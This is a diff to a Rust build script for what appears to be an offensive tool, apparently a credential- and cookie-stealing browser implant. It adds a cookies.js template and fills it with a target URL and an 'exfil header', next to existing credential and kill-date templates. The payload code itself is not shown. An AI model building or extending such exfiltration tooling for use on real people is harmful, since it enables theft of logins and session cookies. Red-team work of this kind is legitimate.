@@ -35,11 +35,16 @@ fn main() {
     let mut credentials_js = fs::read_to_string("src/js/templates/credentials.js")
         .expect("Could not read src/js/templates/credentials.js");
 
+    let mut cookies_js = fs::read_to_string("src/js/templates/cookies.js")
+        .expect("Could not read src/js/templates/cookies.js");
+
     info!(format!("Using target url: {}", config.target_url));
     credentials_js = credentials_js.replace("TARGET_URL", &config.target_url);
+    cookies_js = cookies_js.replace("TARGET_URL", &config.target_url);
 
     info!(format!("Using exfil header: {}", config.exfil_header));
     credentials_js = credentials_js.replace("EXFIL_HEADER", &config.exfil_header);
+    cookies_js = cookies_js.replace("EXFIL_HEADER", &config.exfil_header);
 
     if env::var("CARGO_FEATURE_DEBUG").is_ok() {
         credentials_js = credentials_js.replace("const debug = false;", "const debug = true;");
@@ -47,6 +52,9 @@ fn main() {
 
     let dest_path = Path::new("src/js/processed_credentials.js");
     fs::write(&dest_path, credentials_js).unwrap();
+
+    let dest_path = Path::new("src/js/processed_cookies.js");
+    fs::write(&dest_path, cookies_js).unwrap();
 
     let mut killdate_js = fs::read_to_string("src/js/templates/killdate.js")
         .expect("Could not read src/js/templates/killdate.js");
@@ -57,5 +65,4 @@ fn main() {
 
     let dest_path = Path::new("src/js/processed_killdate.js");
     fs::write(&dest_path, killdate_js).unwrap();
-
 }
